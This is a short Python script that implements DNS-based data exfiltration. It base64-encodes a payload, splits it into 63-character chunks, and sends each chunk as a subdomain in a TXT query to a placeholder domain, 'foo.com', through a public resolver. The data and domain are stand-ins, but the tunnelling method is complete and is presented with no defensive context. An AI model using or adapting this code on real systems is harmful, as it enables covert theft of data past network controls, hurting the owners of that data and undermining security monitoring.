import dns.query
import dns.resolver
import base64

domain_name = 'foo.com'

data_to_transmit = 'bar'

encoded_data = base64.b64encode(data_to_transmit.encode()).decode()

chunks = [encoded_data[i:i+63] for i in range(0, len(encoded_data), 63)]

for i, chunk in enumerate(chunks):
    query_name = f'{chunk}.{i}.{domain_name}'
    dns_query = dns.message.make_query(query_name, dns.rdatatype.TXT)
    dns_response = dns.query.tcp(dns_query, '8.8.8.8')

